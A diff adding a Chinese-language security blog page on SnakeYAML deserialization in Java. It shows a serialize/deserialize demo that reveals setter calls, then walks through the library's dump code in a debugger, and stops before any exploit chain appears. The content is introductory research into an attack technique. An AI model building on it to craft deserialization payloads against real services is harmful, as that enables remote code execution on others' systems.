@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Meteor_Kai">
+
+
+
+    <meta name="description" content="Just Hack For Fun...">
+
+
+    <meta name="keywords" content="Web exploits bring me great joy!">
+
+
+<title>Java反序列化之SnakeYaml链 | Meteor_Kai</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const pagebody = document.getElementsByTagName('body')[0]
+
+            function setTheme(status) {
+
+                if (status === 'dark') {
+                    window.sessionStorage.theme = 'dark'
+                    pagebody.classList.add('dark-theme');
+
+                } else if (status === 'light') {
+                    window.sessionStorage.theme = 'light'
+                    pagebody.classList.remove('dark-theme');
+                }
+            };
+
+            setTheme(window.sessionStorage.theme)
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Meteor_Kai&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                <a class="menu-item" href="/archives">Posts</a>
+                
+                <a class="menu-item" href="/categories">Categories</a>
+                
+                <a class="menu-item" href="/tags">Tags</a>
+                
+                <a class="menu-item" href="/about">About</a>
+                
+                <a class="menu-item" href="/links">Links</a>
+                
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Meteor_Kai&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">
+                    <svg class="menu-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M4.5 17.27q-.213 0-.356-.145T4 16.768t.144-.356t.356-.143h15q.213 0 .356.144q.144.144.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.144T4 11.999t.144-.356t.356-.143h15q.213 0 .356.144t.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.143Q4 7.443 4 7.23t.144-.356t.356-.143h15q.213 0 .356.144T20 7.23t-.144.356t-.356.144z"/></svg>
+                    <svg class="close-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Material Symbols Light by Google - https://github.com/google/material-design-icons/blob/master/LICENSE --><path fill="currentColor" d="m12 12.708l-5.246 5.246q-.14.14-.344.15t-.364-.15t-.16-.354t.16-.354L11.292 12L6.046 6.754q-.14-.14-.15-.344t.15-.364t.354-.16t.354.16L12 11.292l5.246-5.246q.14-.14.345-.15q.203-.01.363.15t.16.354t-.16.354L12.708 12l5.246 5.246q.14.14.15.345q.01.203-.15.363t-.354.16t-.354-.16z"/></svg>
+                </div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                <a class="menu-item" href="/archives">Posts</a>
+                
+                <a class="menu-item" href="/categories">Categories</a>
+                
+                <a class="menu-item" href="/tags">Tags</a>
+                
+                <a class="menu-item" href="/about">About</a>
+                
+                <a class="menu-item" href="/links">Links</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.classList.contains("active")) {
+            toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        } else {
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Java反序列化之SnakeYaml链</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Meteor_Kai</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">August 8, 2026&nbsp;&nbsp;13:26:18</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/10/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-SnakeYaml-%E9%93%BE/">https://drun1baby.top/2022/10/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-SnakeYaml-%E9%93%BE/</a><br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/jdbc-injection-with-hertzbeat-cve-2024-42323.html">从HertzBeat聊聊SnakeYAML反序列化 | 离别歌</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15160">SnakeYaml反序列化原理分析和利用总结-先知社区</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/10103">SnakeYaml 之不出网RCE-先知社区</a></p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/1.png" class="" title="Pasted image 20260806184521">
+<p>SnakeYaml 是 Java 的 yaml 解析类库，支持 Java 对象的序列化&#x2F;反序列化。我们先了解一下 yaml 语法：</p>
+<ol>
+<li>YAML 大小写敏感；</li>
+<li>使用缩进代表层级关系，这点和 properties 文件的差别非常之大</li>
+<li>缩进只能使用空格，不能使用 TAB，不要求空格个数，只需要相同层级左对齐（一般2个或4个空格）</li>
+</ol>
+<h1 id="SnakeYaml序列化与反序列化"><a href="#SnakeYaml序列化与反序列化" class="headerlink" title="SnakeYaml序列化与反序列化"></a>SnakeYaml序列化与反序列化</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>SnakeYaml 提供了 <code>Yaml.dump()</code> 和 <code>Yaml.load()</code> 两个函数对 yaml 格式的数据进行序列化和反序列化。</p>
+<ul>
+<li>Yaml.load()：入参是一个字符串或者一个文件，经过序列化之后返回一个 Java 对象；</li>
+<li>Yaml.dump()：将一个对象转化为 yaml 文件形式；</li>
+</ul>
+<p>dump 是序列化，load 是反序列化，这和 Python Pickle 反序列化的一样的</p>
+<p>下面给出demo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">person_test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span>&#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        person.setName(<span class="string">&quot;Meteor_Kai&quot;</span>);  </span><br><span class="line">        person.setAge(<span class="number">20</span>);  </span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();  </span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> yaml.dump(person);  </span><br><span class="line">        System.out.println(str);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        serialize();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/2.png" class="" title="Pasted image 20260805154152">
+
+<p>反序列化代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span>&#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;!!Person &#123;age: 20, name: Meteor_Kai&#125;&quot;</span>;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="string">&quot;age: 20\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;name: Meteor_Kai&quot;</span>;  </span><br><span class="line">    <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();  </span><br><span class="line">    yaml.load(str1);  </span><br><span class="line">    yaml.loadAs(str2, Person.class);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在反序列化之前，我们更改一下Person.java的代码。如果一个库的反序列化方法，能够自动调用 <code>getter/setter</code> 方法，那无疑是很危险的，比如 Fastjson hh</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SerializeTest;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> Integer age;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数被调用&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printInfo</span><span class="params">()</span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;name is &quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;age is&quot;</span> + <span class="built_in">this</span>.age);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getName 方法被调用&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setName 方法被调用&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge 方法被调用&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setAge 方法被调用&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/3.png" class="" title="Pasted image 20260805154801">
+
+<p>这一幕，神似fastjson。很明显，调用了 setter 方法，如果我把反序列化的语句改成 <code>&quot;!!SerializeTest.Person &#123;name: Meteor_Kai&#125;&quot;</code>，那么就只会调用 <code>setter</code> 中的 setName 方法</p>
+<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>我们首先跟进dump方法，进入序列化的过程。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/4.png" class="" title="Pasted image 20260806100708">
+
+<p>它先是 new 了一个 ArrayList，准备将之后序列化完成的数据存储到这个 ArrayList 里面。这个list中首先存放最初的要被序列化的对象。然后跟进dumpAll方法。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/5.png" class="" title="Pasted image 20260806100746">
+
+<p>它是在做 <code>dump()</code> 的业务，把 Java 对象转换为 Yaml 类型的字符串。dumpAll的参数data是对象的迭代器。此处其实就是将迭代器中的数据“转储（Dump）”成字符串。buffer是缓冲区，存储java对象转换之后的字符串。然后继续跟进<code>this.dumpAll</code>方法，里面是具体的业务。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/6.png" class="" title="Pasted image 20260806101000">
+
+<p>这里首先new了一个Serializer对象，Serializer 对象里面放了一个 Emitter 对象。这个方法的作用就是把一个 Java 对象迭代器里的所有元素，序列化成 YAML 格式的字符串，写入到输出流中。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/7.png" class="" title="Pasted image 20260806101350">
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Serializer</span> <span class="variable">serializer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Serializer</span>(</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Emitter</span>(output, <span class="built_in">this</span>.dumperOptions),  <span class="comment">// ① 发射器</span></span><br><span class="line">    <span class="built_in">this</span>.resolver,                            <span class="comment">// ② 解析器</span></span><br><span class="line">    <span class="built_in">this</span>.dumperOptions,                       <span class="comment">// ③ 配置选项</span></span><br><span class="line">    rootTag                                   <span class="comment">// ④ 根标签</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>Emitter负责<strong>真正写字符</strong>到 <code>Writer</code> 中，处理缩进、换行、冒号等 YAML 语法格式。while循环中的representer把 Java 对象（比如 <code>Person</code> 对象、<code>Map</code>、<code>List</code>）转换成 SnakeYAML 内部的 <strong><code>Node</code>（节点）树结构</strong>。然后由serializer将node按照 YAML 语法，通过 <code>Emitter</code> 写入到 <code>Writer</code> 中。</p>
+<p>接下来我们跟进一下represent方法。对象通过representData方法被转换成node。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/8.png" class="" title="Pasted image 20260806101911">
+
+<p>那么继续跟进representData方法。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/9.png" class="" title="Pasted image 20260806102020">
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Node <span class="title function_">representData</span><span class="params">(Object data)</span> &#123;  </span><br><span class="line">    <span class="built_in">this</span>.objectToRepresent = data;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.representedObjects.containsKey(<span class="built_in">this</span>.objectToRepresent)) &#123;  </span><br><span class="line">        <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> (Node)<span class="built_in">this</span>.representedObjects.get(<span class="built_in">this</span>.objectToRepresent);  </span><br><span class="line">        <span class="keyword">return</span> node;  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> <span class="built_in">this</span>.nullRepresenter.representData((Object)<span class="literal">null</span>);  </span><br><span class="line">        <span class="keyword">return</span> node;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        Class&lt;?&gt; clazz = data.getClass();  </span><br><span class="line">        Node node;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.representers.containsKey(clazz)) &#123;  </span><br><span class="line">            <span class="type">Represent</span> <span class="variable">representer</span> <span class="operator">=</span> (Represent)<span class="built_in">this</span>.representers.get(clazz);  </span><br><span class="line">            node = representer.representData(data);  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="keyword">for</span>(Class&lt;?&gt; repr : <span class="built_in">this</span>.multiRepresenters.keySet()) &#123;  </span><br><span class="line">                <span class="keyword">if</span> (repr != <span class="literal">null</span> &amp;&amp; repr.isInstance(data)) &#123;  </span><br><span class="line">                    <span class="type">Represent</span> <span class="variable">representer</span> <span class="operator">=</span> (Represent)<span class="built_in">this</span>.multiRepresenters.get(repr);  </span><br><span class="line">                    node = representer.representData(data);  </span><br><span class="line">                    <span class="keyword">return</span> node;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.multiRepresenters.containsKey((Object)<span class="literal">null</span>)) &#123;  </span><br><span class="line">                <span class="type">Represent</span> <span class="variable">representer</span> <span class="operator">=</span> (Represent)<span class="built_in">this</span>.multiRepresenters.get((Object)<span class="literal">null</span>);  </span><br><span class="line">                node = representer.representData(data);  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="type">Represent</span> <span class="variable">representer</span> <span class="operator">=</span> (Represent)<span class="built_in">this</span>.representers.get((Object)<span class="literal">null</span>);  </span><br><span class="line">                node = representer.representData(data);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> node;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个方法其实在<strong>给定一个 Java 对象，按照“查缓存 → 精确匹配 → 父类&#x2F;接口匹配 → 默认匹配”的顺序，找到对应的“翻译器（Represent）”，把对象转换成 Node 节点。</strong></p>
+<p>此处我们的Person.class会进入最后的默认匹配，因为这是我们自定义的类，它找不到翻译器representer。所以就会获取默认的翻译器representer（RepresentJavaBean）来处理我们的自定义类。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/10.png" class="" title="Pasted image 20260806102900">
+
+<p>然后我们继续跟进<code>representer.representData(data)</code>。这里其实就是跟进到RepresentJavaBean的representData方法。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/11.png" class="" title="Pasted image 20260806103015">
+
+<p>发现它直接return一个representJavaBean，这里其实就是接收一个自定义对象（<code>data</code>），<strong>获取该类的所有属性信息</strong>，然后调用 <code>representJavaBean</code> 方法把这些属性和值转换成 YAML 节点。继续跟进。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/12.png" class="" title="Pasted image 20260806103451">
+<p>此处是SnakeYAML 处理自定义类的“核心引擎”。通过反射遍历 JavaBean 的所有属性，把每个属性名和属性值转换成 YAML 的键值对（NodeTuple），最终组装成一个 MappingNode（即 YAML 里的 <code>key: value</code> 映射结构）</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/13.png" class="" title="Pasted image 20260806104000">
+<p>此处的for循环是遍历Person类中的所有属性，利用representJavaBeanProperty方法逐个处理。</p>
+<p>然后我们跟进representJavaBeanProperty方法。这里负责把一个 JavaBean 的属性（比如 <code>Person.name</code>）转换成 YAML 的键值对（<code>name: &quot;张三&quot;</code>），并处理各种边界情况（别名、枚举、泛型等）。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/14.png" class="" title="Pasted image 20260806104236">
+<p>nodeKey是键，nodeValue是值。if循环负责处理各种特殊情况。下面稍微解释一下。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (propertyValue != <span class="literal">null</span> &amp;&amp; !hasAlias) &#123;  <span class="comment">// 只有非空且没有循环引用时才处理</span></span><br><span class="line">    <span class="type">NodeId</span> <span class="variable">nodeId</span> <span class="operator">=</span> nodeValue.getNodeId();</span><br><span class="line">    <span class="keyword">if</span> (customTag == <span class="literal">null</span>) &#123;  <span class="comment">// 如果没有自定义 Tag</span></span><br><span class="line">        <span class="keyword">if</span> (nodeId == NodeId.scalar) &#123;  <span class="comment">// 情况1：属性值是标量（字符串、数字等）</span></span><br><span class="line">            <span class="keyword">if</span> (property.getType() != Enum.class &amp;&amp; propertyValue <span class="keyword">instanceof</span> Enum) &#123;</span><br><span class="line">                nodeValue.setTag(Tag.STR);  <span class="comment">// ⭐ 枚举强制转成字符串</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  <span class="comment">// 情况2：属性值是集合或映射</span></span><br><span class="line">            <span class="keyword">if</span> (nodeId == NodeId.mapping &amp;&amp; </span><br><span class="line">                property.getType() == propertyValue.getClass() &amp;&amp; </span><br><span class="line">                !(propertyValue <span class="keyword">instanceof</span> Map) &amp;&amp; </span><br><span class="line">                !nodeValue.getTag().equals(Tag.SET)) &#123;</span><br><span class="line">                nodeValue.setTag(Tag.MAP);  <span class="comment">// ⭐ 自定义对象强制转成 MAP 标签</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.checkGlobalTag(property, nodeValue, propertyValue);  <span class="comment">// ⭐ 检查全局标签配置</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后返回一个组装后的NodeTuple，跟进看看结构。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/15.png" class="" title="Pasted image 20260806105148">
+<p>大致的工作流程就是如上所示，最后我们的键值对会保存到 list 当中<br>经过逐个处理后会添加到value中。最终representJavaBean会返回一个node（MappingNode）。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/16.png" class="" title="Pasted image 20260806105356">
+
+<p>然后再回到先前的dumpAll方法，对返回的node进行序列化操作，并由Emiiter写入output并输出。</p>
